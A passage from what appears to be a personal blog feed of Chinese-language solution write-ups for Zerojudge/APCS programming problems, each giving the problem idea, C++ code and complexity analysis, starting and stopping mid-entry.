class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			v[i].clear();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,a,b ; i&lt;n<span class="number">-1</span> ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line">			v[a].push_back(b);</span><br><span class="line">			v[b].push_back(a);</span><br><span class="line">		&#125;</span><br><span class="line">		far = &#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">		dfs(<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">		dfs(far.second,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;far.first&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>DFS複雜度為 $O(n)$<br>總複雜度 $O(n)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
        <tag>Tree</tag>
        <tag>樹直徑</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge b840</title>
    <url>/2021/03/23/Zerojudge%20b840/</url>
    <content><![CDATA[<h1 id="Zerojudge-b840"><a href="#Zerojudge-b840" class="headerlink" title="Zerojudge b840"></a>Zerojudge b840</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=b840" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=b840</a></p>
<p>給一個 $n \times n$ 的陣列，求最大矩形和</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>暴力枚舉左上角的點以及長寬，將答案加總後取最大值</p>
<p>因為本題題目範圍很小可以這樣做</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,arr[<span class="number">25</span>][<span class="number">25</span>],ans=<span class="number">0</span>,cnt=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;n ; j++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;n ; j++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span> ; k+i&lt;n ; k++)&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> l=<span class="number">0</span> ; l+j&lt;n ; l++)&#123;</span><br><span class="line">					cnt=<span class="number">0</span>;</span><br><span class="line">					<span class="keyword">for</span>(<span class="keyword">int</span> p=i ; p&lt;=i+k ; p++)&#123;</span><br><span class="line">						<span class="keyword">for</span>(<span class="keyword">int</span> q=j ; q&lt;=j+l ; q++)&#123;</span><br><span class="line">							cnt+=arr[p][q];</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					ans=max(cnt, ans);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h3><p>總時間複雜度為 $O(n^2 + n^6)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge b966</title>
    <url>/2020/06/27/Zerojudge%20b966/</url>
    <content><![CDATA[<h1 id="Zerojudge-b966"><a href="#Zerojudge-b966" class="headerlink" title="Zerojudge b966"></a>Zerojudge b966</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=b966" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=b966</a><br>給定多個線段，求所有線段除去覆蓋部分的長度總和</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>將所有線段排序後將完全覆蓋的線段除去<br>接下來的線段只需討論是否有重疊部分，若有，則將線段界線更新</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">vector</span>&lt;pii&gt; v,res;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,l,r ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;l&gt;&gt;r;</span><br><span class="line">		v.emplace_back(l,r);</span><br><span class="line">	&#125;</span><br><span class="line">	sort(v.begin(),v.end());</span><br><span class="line">	<span class="keyword">int</span> Max=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">auto</span> i: v)&#123;</span><br><span class="line">		<span class="keyword">if</span>(i.second&gt;Max)&#123;</span><br><span class="line">			res.push_back(i);</span><br><span class="line">			Max=i.second;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;res.size()<span class="number">-1</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(res[i].second&gt;=res[i+<span class="number">1</span>].first)&#123;</span><br><span class="line">			res[i+<span class="number">1</span>].first=res[i].first;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			ans+=res[i].second-res[i].first;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	ans+=res[res.size()<span class="number">-1</span>].second-res[res.size()<span class="number">-1</span>].first;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>排序複雜度 $O(nlogn)$<br>搜尋答案複雜度 $O(n)$<br>總複雜度 $O(n+nlogn)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c291</title>
    <url>/2020/06/29/Zerojudge%20c291/</url>
    <content><![CDATA[<h1 id="Zerojudge-c291"><a href="#Zerojudge-c291" class="headerlink" title="Zerojudge c291"></a>Zerojudge c291</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c291" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c291</a><br>給每個人跟誰屬於同一個群體，求總群體個數</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>將所有人的關係建成圖，DFS每個點即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,ans=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; Next[<span class="number">50005</span>];</span><br><span class="line"><span class="keyword">bool</span> vis[<span class="number">50005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> px)</span></span>&#123;</span><br><span class="line">	vis[px]=<span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">bool</span> end=<span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">auto</span> i: Next[px])&#123;</span><br><span class="line">		<span class="keyword">if</span>(!vis[i])&#123;</span><br><span class="line">			dfs(i);</span><br><span class="line">			end=<span class="literal">false</span>;</span><br><span class="line">		&#125;	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(end)</span><br><span class="line">		ans++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,tmp ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">		Next[i].push_back(tmp);</span><br><span class="line">		Next[tmp].push_back(i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!vis[i])&#123;</span><br><span class="line">			dfs(i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>DFS複雜度為 $O(n)$<br>總複雜度 $O(n)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c294</title>
    <url>/2020/06/29/Zerojudge%20c294/</url>
    <content><![CDATA[<h1 id="Zerojudge-c294"><a href="#Zerojudge-c294" class="headerlink" title="Zerojudge c294"></a>Zerojudge c294</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c294" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c294</a><br>給三邊長，求是否能形成三角形，若可以，為哪種三角形</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>題敘中有給符合各種三角形的敘述了，跟著判斷即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> tri[<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">3</span> ; i++) <span class="built_in">cin</span>&gt;&gt;tri[i];</span><br><span class="line">	sort(tri,tri+<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;tri[<span class="number">0</span>]&lt;&lt;<span class="string">" "</span>&lt;&lt;tri[<span class="number">1</span>]&lt;&lt;<span class="string">" "</span>&lt;&lt;tri[<span class="number">2</span>]&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">if</span>(tri[<span class="number">0</span>]+tri[<span class="number">1</span>] &lt;= tri[<span class="number">2</span>])</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"No\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">pow</span>(tri[<span class="number">0</span>],<span class="number">2</span>)+<span class="built_in">pow</span>(tri[<span class="number">1</span>],<span class="number">2</span>) == <span class="built_in">pow</span>(tri[<span class="number">2</span>],<span class="number">2</span>))</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Right\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">pow</span>(tri[<span class="number">0</span>],<span class="number">2</span>)+<span class="built_in">pow</span>(tri[<span class="number">1</span>],<span class="number">2</span>) &lt; <span class="built_in">pow</span>(tri[<span class="number">2</span>],<span class="number">2</span>))</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Obtuse\n"</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Acute\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>準確來說是 $O(log3)$，大約為 $O(1)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c290</title>
    <url>/2020/06/29/Zerojudge%20c290/</url>
    <content><![CDATA[<h1 id="Zerojudge-c290"><a href="#Zerojudge-c290" class="headerlink" title="Zerojudge c290"></a>Zerojudge c290</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c290" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c290</a><br>給一個10位數，不超過1000位數，求奇數和與偶數位數合之差的絕對值</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>數字用字串儲存，接下來將奇數位數與偶數位數算出來即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">0</span>,b=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">	<span class="keyword">bool</span> A=<span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=s.size()<span class="number">-1</span> ; i&gt;=<span class="number">0</span> ; i--)&#123;</span><br><span class="line">		<span class="keyword">if</span>(A)</span><br><span class="line">			a+=(s[i]-<span class="string">'0'</span>);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			b+=(s[i]-<span class="string">'0'</span>);</span><br><span class="line">		A=!A;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="built_in">abs</span>(a-b)&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>$O(len(s))$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c292</title>
    <url>/2020/06/29/Zerojudge%20c292/</url>
    <content><![CDATA[<h1 id="Zerojudge-c292"><a href="#Zerojudge-c292" class="headerlink" title="Zerojudge c292"></a>Zerojudge c292</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c292" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c292</a><br>給一個二維正方形陣列，邊長為奇數，求從中心點開始向指定方向開始走(上/下/左/右)，繞圈走過的元素依照走訪順序輸出</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>模擬一遍即可<br>我的作法是記錄現在走訪到哪裡，接下來要往哪個方向走多少距離<br>將走過點的值儲存到一個陣列中<br>需要留意在最後一次走訪時前進距離會少1</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,st,arr[<span class="number">50</span>][<span class="number">50</span>];</span><br><span class="line"><span class="keyword">int</span> row=<span class="number">1</span>,col=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> last=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">string</span> ans;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> face)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(col+row == <span class="number">2</span>*n+<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span>(st%<span class="number">2</span>==<span class="number">0</span> &amp;&amp; col+row==<span class="number">2</span>*n)</span><br><span class="line">		last=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(st%<span class="number">2</span>==<span class="number">1</span> &amp;&amp; col+row==<span class="number">2</span>*n)</span><br><span class="line">		last=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(face==<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="comment">//left</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=col-last ; i++)&#123;</span><br><span class="line">			ans+=(<span class="keyword">char</span>)(<span class="string">'0'</span>+arr[x][y-i]);</span><br><span class="line">		&#125;</span><br><span class="line">		col++;</span><br><span class="line">		solve(x,y-(col<span class="number">-1</span>),<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(face==<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="comment">//up</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=row-last ; i++)&#123;</span><br><span class="line">			ans+=(<span class="keyword">char</span>)(<span class="string">'0'</span>+arr[x-i][y]);</span><br><span class="line">		&#125;</span><br><span class="line">		row++;</span><br><span class="line">		solve(x-(row<span class="number">-1</span>),y,<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(face==<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="comment">//right</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=col-last ; i++)&#123;</span><br><span class="line">			ans+=(<span class="keyword">char</span>)(<span class="string">'0'</span>+arr[x][y+i]);</span><br><span class="line">		&#125;</span><br><span class="line">		col++;</span><br><span class="line">		solve(x,y+(col<span class="number">-1</span>),<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(face==<span class="number">3</span>)&#123;</span><br><span class="line">		<span class="comment">//down</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=row-last ; i++)&#123;</span><br><span class="line">			ans+=(<span class="keyword">char</span>)(<span class="string">'0'</span>+arr[x+i][y]);</span><br><span class="line">		&#125;</span><br><span class="line">		row++;</span><br><span class="line">		solve(x+(row<span class="number">-1</span>),y,<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;st;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;n ; j++)</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">	ans+=(<span class="keyword">char</span>)(<span class="string">'0'</span>+arr[n/<span class="number">2</span>][n/<span class="number">2</span>]);</span><br><span class="line">	solve(n/<span class="number">2</span>,n/<span class="number">2</span>,st);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>每個點走訪一遍，每個點走訪時間複雜度為 $O(1)$<br>總複雜度 $O(n^2)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c296</title>
    <url>/2020/06/29/Zerojudge%20c296/</url>
    <content><![CDATA[<h1 id="Zerojudge-c296"><a href="#Zerojudge-c296" class="headerlink" title="Zerojudge c296"></a>Zerojudge c296</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c296" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c296</a><br>有 $N$ 個人圍成一圈，編號 $1$ ~ $N$，從編號 $1$ 開始每 $m$ 回合後從開頭數過來第 $m$ 個人會被淘汰，下一回合從被淘汰的下一個人開始<br>問經過 $k$ 回合後最後被淘汰的下一個人標號為多少</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><h3 id="暴力-45"><a href="#暴力-45" class="headerlink" title="暴力(45%)"></a>暴力(45%)</h3><p>一開始最好想到的就是跟著模擬一遍，大概會是長這樣子<br>利用編號必定會是遞增的特性，搭配sort可以使每次只需花費 $O(nlogn)$ 的時間</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,k;</span><br><span class="line"><span class="built_in">vector</span>&lt;pii&gt; v;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;k;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++) v.emplace_back(i,i);</span><br><span class="line">	<span class="keyword">int</span> last=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(k--)&#123;</span><br><span class="line">		last=(last+m<span class="number">-1</span>)%n;</span><br><span class="line">		n--;</span><br><span class="line">		v[last].first=INT_MAX;</span><br><span class="line">		sort(v.begin(),v.end());</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;v[(last)%n].second&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="觀察規律"><a href="#觀察規律" class="headerlink" title="觀察規律"></a>觀察規律</h3><p>觀察原序號與新序號的關係(假設都從0開始)<br>例如: 當現在 $n=5, m=2, k=4$</p>
<ul>
<li>第一輪<br>  $1$ 號被淘汰</li>
</ul>
<table>
<thead>
<tr>
<th align="center">上一輪編號</th>
<th align="center">0</th>
<th align="center">1</th>
<th align="center">2</th>
<th align="center">3</th>
<th align="center">4</th>
</tr>
</thead>
<tbody><tr>
<td align="center">新編號</td>
<td align="center">3</td>
<td align="center">-</td>
<td align="center">0</td>
<td align="center">1</td>
<td align="center">2</td>
</tr>
</tbody></table>
<ul>
<li>第二輪<br>  $2$ 號被淘汰(上一輪編號)</li>
</ul>
<table>
<thead>
<tr>
<th align="center">上一輪編號</th>
<th align="center">3</th>
<th align="center">-</th>
<th align="center">0</th>
<th align="center">1</th>
<th align="center">2</th>
</tr>
</thead>
<tbody><tr>
<td align="center">新編號</td>
<td align="center">1</td>
<td align="center">-</td>
<td align="center">2</td>
<td align="center">-</td>
<td align="center">0</td>
</tr>
</tbody></table>
<ul>
<li>第三輪<br>  $0$ 號被淘汰(上一輪編號)</li>
</ul>
<table>
<thead>
<tr>
<th align="center">上一輪編號</th>
<th align="center">1</th>
<th align="center">-</th>
<th align="center">2</th>
<th align="center">-</th>
<th align="center">0</th>
</tr>
</thead>
